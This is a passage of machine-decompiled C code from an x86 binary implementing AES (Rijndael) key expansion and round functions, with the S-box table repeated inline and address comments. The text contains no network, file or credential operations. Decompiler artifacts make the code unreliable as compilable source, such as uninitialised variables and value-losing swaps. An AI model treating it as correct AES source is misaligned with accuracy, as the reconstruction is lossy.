\xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
        v19 = *(char *)(v5 / 8 + (int32_t)&g71);
        v20 = *(char *)(v11 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
        v21 = 256 * (int32_t)v18 | v11;
        v1 = v21;
        v13 = v21;
        v15 = v17;
        v14 = 256 * (int32_t)v16 | (int32_t)(v20 ^ v19);
    }
    int32_t v28 = v5 + 1; // 0x401186
    v1 = v13 & -256 | (int32_t)v15;
    *(char *)(v3 + 3) = *(char *)(v3 - 29) ^ (char)v14;
    int32_t result = v3 + 4; // 0x401195
    *(char *)result = *(char *)(v3 - 28) ^ (char)(v14 / 256);
    *(char *)(v3 + 5) = *(char *)(v3 - 27) ^ v15;
    char v29 = *(char *)(v3 - 26) ^ (char)(v13 / 256); // 0x4011a5
    *(char *)(v3 + 6) = v29;
    while (v28 != 60) {
        // 0x401100
        v5 = v28;
        int32_t v30 = result;
        v6 = *(char *)(v30 + 1);
        v7 = v29;
        v8 = v1;
        v9 = v8 & -0xff01 | 256 * v7;
        v1 = v9;
        v10 = (int32_t)*(char *)(v30 - 1);
        v11 = (int32_t)*(char *)v30;
        v12 = v5 & 7;
        if (v12 != 0) {
            // 0x401153
            v13 = v9;
            v15 = v6;
            v14 = 256 * v11 | v10;
            if (v12 == 4) {
                // 0x401158
                v22 = v6;
                v23 = *(char *)(v10 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                v24 = *(char *)(v11 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                v25 = *(char *)(v22 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                v26 = *(char *)(v7 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                v27 = v8 & -0x10000 | v22 | 256 * (int32_t)v26;
                v1 = v27;
                v13 = v27;
                v15 = v25;
                v14 = 256 * (int32_t)v24 | (int32_t)v23;
            }
        } else {
            // 0x401118
            v16 = *(char *)((int32_t)v6 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v17 = *(char *)(v7 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v18 = *(char *)(v10 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v19 = *(char *)(v5 / 8 + (int32_t)&g71);
            v20 = *(char *)(v11 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            v21 = 256 * (int32_t)v18 | v11;
            v1 = v21;
            v13 = v21;
            v15 = v17;
            v14 = 256 * (int32_t)v16 | (int32_t)(v20 ^ v19);
        }
        char v31 = *(char *)(v30 - 29); // 0x401182
        v28 = v5 + 1;
        v1 = v13 & -256 | (int32_t)v15;
        *(char *)(v30 + 3) = v31 ^ (char)v14;
        char v32 = *(char *)(v30 - 28); // 0x40118f
        result = v30 + 4;
        *(char *)result = v32 ^ (char)(v14 / 256);
        char v33 = *(char *)(v30 - 27); // 0x401198
        *(char *)(v30 + 5) = v33 ^ v15;
        v29 = *(char *)(v30 - 26) ^ (char)(v13 / 256);
        *(char *)(v30 + 6) = v29;
    }
    // 0x4011b6
    return result;
}

// Address range: 0x4011c0 - 0x401407
// Used cryptographic patterns:
//  - AES_Rijndael_S___ARIA_S1 (8-bit, little endian)
int32_t function_4011c0(void) {
    int32_t v1 = 4; // 0x4011dc
    int32_t v2 = 4; // 0x4011e0
    int32_t v3; // 0x4011c0
    char * v4 = (char *)v3; // 0x4011e8
    int32_t v5; // 0x4011c0
    int32_t v6; // 0x4011c0
    *v4 = *v4 ^ *(char *)(v5 - v6 + v3);
    int32_t v7 = v3 + 1; // 0x4011ea
    v2--;
    int32_t v8 = v7; // 0x4011ee
    while (v2 != 0) {
        // 0x4011e5
        v4 = (char *)v8;
        *v4 = *v4 ^ *(char *)(v5 - v6 + v8);
        v7 = v8 + 1;
        v2--;
        v8 = v7;
    }
    // 0x4011f0
    v1--;
    while (v1 != 0) {
        // 0x4011e0
        v2 = 4;
        v4 = (char *)v7;
        *v4 = *v4 ^ *(char *)(v5 - v6 + v7);
        v7++;
        v2--;
        v8 = v7;
        while (v2 != 0) {
            // 0x4011e5
            v4 = (char *)v8;
            *v4 = *v4 ^ *(char *)(v5 - v6 + v8);
            v7 = v8 + 1;
            v2--;
            v8 = v7;
        }
        // 0x4011f0
        v1--;
    }
    char * v9 = (char *)(v6 + 5);
    char * v10 = (char *)(v6 + 1);
    char * v11 = (char *)(v6 + 9);
    char * v12 = (char *)(v6 + 13);
    char * v13 = (char *)(v6 + 10);
    int32_t v14 = v6 + 2; // 0x40125d
    char * v15 = (char *)v14;
    char * v16 = (char *)(v6 + 14);
    char * v17 = (char *)(v6 + 6);
    char * v18 = (char *)(v6 + 15);
    char * v19 = (char *)(v6 + 3);
    char * v20 = (char *)(v6 + 11);
    char * v21 = (char *)(v6 + 7);
    int32_t v22 = 13; // 0x401202
    while (true) {
      lab_0x401205:;
        int32_t v23 = 4; // 0x40120e
        int32_t v24; // 0x4011c0
        int32_t v25 = v24; // 0x401217
        int32_t v26 = 4; // 0x401217
        char * v27 = (char *)v25; // 0x401220
        unsigned char v28 = *v27; // 0x401220
        char v29 = *(char *)((int32_t)v28 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x401226
        *v27 = v29;
        v26--;
        v25 += 4;
        while (v26 != 0) {
            // 0x401220
            v27 = (char *)v25;
            v28 = *v27;
            v29 = *(char *)((int32_t)v28 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            *v27 = v29;
            v26--;
            v25 += 4;
        }
        // 0x401234
        v23--;
        v24++;
        while (v23 != 0) {
            // 0x401210
            v25 = v24;
            v26 = 4;
            v27 = (char *)v25;
            v28 = *v27;
            v29 = *(char *)((int32_t)v28 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            *v27 = v29;
            v26--;
            v25 += 4;
            while (v26 != 0) {
                // 0x401220
                v27 = (char *)v25;
                v28 = *v27;
                v29 = *(char *)((int32_t)v28 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                *v27 = v29;
                v26--;
                v25 += 4;
            }
            // 0x401234
            v23--;
            v24++;
        }
        // 0x40123b
        *v10 = *v9;
        *v9 = *v11;
        *v11 = *v12;
        *v12 = *v10;
        *v15 = *v13;
        *v13 = *v15;
        *v17 = *v16;
        *v16 = *v17;
        *v19 = *v18;
        *v18 = *v20;
        *v20 = *v21;
        *v21 = *v19;
        int32_t v30 = 4; // 0x40128e
        int32_t v31 = v14; // 0x40128e
        while (true) {
            char * v32 = (char *)(v31 + 1); // 0x401291
            char v33 = *v32; // 0x401291
            char * v34 = (char *)(v31 - 2); // 0x401297
            char v35 = *v34; // 0x401297
            char * v36 = (char *)v31; // 0x40129c
            char v37 = *v36; // 0x40129c
            char * v38 = (char *)(v31 - 1); // 0x4012a1
            char v39 = *v38; // 0x4012a1
            char v40 = v37 ^ v33; // 0x4012a4
            char v41 = v39 ^ v35; // 0x4012a9
            char v42 = v40 ^ v35; // 0x4012ad
            char v43 = v42 ^ v39; // 0x4012b9
            char v44 = v39 ^ v37; // 0x4012c5
            *v34 = 2 * v41 ^ v35 ^ v43 ^ v41 >> 7 & 27;
            char v45 = v35 ^ v33; // 0x4012e0
            *v38 = 2 * v44 ^ v42 ^ v44 >> 7 & 27;
            *v36 = 2 * v40 ^ v37 ^ v40 >> 7 & 27 ^ v43;
            *v32 = 2 * v45 ^ v33 ^ v45 >> 7 & 27 ^ v43;
            v30--;
            v31 += 4;
            if (v30 == 0) {
                goto lab_0x401335;
            }
        }
        goto lab_0x401348;
    }
  lab_0x401360:;
    int32_t v46; // 0x4011c0
    while (true) {
        // 0x401360
        int32_t v47; // 0x4011c0
        int32_t v48 = v47; // 0x401367
        int32_t v49 = 4; // 0x401367
        char * v50 = (char *)v48; // 0x401370
        unsigned char v51 = *v50; // 0x401370
        char v52 = *(char *)((int32_t)v51 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x401376
        *v50 = v52;
        v49--;
        v48 += 4;
        while (v49 != 0) {
            // 0x401370
            v50 = (char *)v48;
            v51 = *v50;
            v52 = *(char *)((int32_t)v51 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
            *v50 = v52;
            v49--;
            v48 += 4;
        }
        int32_t v53 = v46 - 1; // 0x401385
        v46 = v53;
        v47++;
        if (v53 == 0) {
            // break -> 0x40138a
            break;
        }
    }
    // 0x40138a
